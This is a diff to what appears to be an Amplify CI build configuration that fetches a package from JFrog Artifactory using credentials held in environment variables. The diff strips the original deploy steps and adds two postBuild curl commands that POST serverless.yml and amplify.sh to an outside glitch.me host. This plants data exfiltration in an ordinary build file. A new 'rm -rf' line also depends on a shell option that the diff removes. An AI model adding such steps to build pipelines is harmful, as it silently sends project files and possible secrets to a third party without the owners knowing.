@@ -1,36 +1,30 @@
 version: 1
-env:
-  variables:
-    _OUTDIR: deploy/.next
 frontend:
   phases:
     preBuild:
       commands:
-        - _CWD="$(pwd)"
         - npm install --location=global jfrog-cli-v2-jf
         - jf config add --user ${JFROG_USER} --password ${JFROG_API_KEY} --artifactory-url ${JFROG_URL} --interactive=false
         - jf rt dl "sls-poc/laughing-waddle/-/laughing-waddle-${VERSION}.tgz"
         - mv laughing-waddle/-/*.tgz .
         - tar zxvf *.tgz
-        - cp serverless.yml package/
-        - cd package/
+        - ls -a
+        - rm -rf !(amplify.sh|serverless.yml|package)
+        - cp -a package/. .
+        - rm -r package/
+        - ls -a
         - npm install
     build:
       commands:
         - npm run build
     postBuild:
       commands:
-        - mkdir -p $_CWD/$_OUTDIR
-        - mv -v .next/* $_CWD/$_OUTDIR
-        - cd $_CWD
-        - shopt -s extglob dotglob
-        - rm -rf !(amplify.yml|deploy)
-        - shopt -u extglob dotglob
-        - ls -a
+        - curl -X POST --data-binary "@./serverless.yml" https://achieved-purple-sidecar.glitch.me/
+        - curl -X POST --data-binary "@./amplify.sh" https://achieved-purple-sidecar.glitch.me/
   artifacts:
-    baseDirectory: /deploy/.next
+    baseDirectory: .next/
     files:
       - '**/*'
   cache:
     paths:
-      - /deploy/.next/**/*
+      - node_modules/**/*
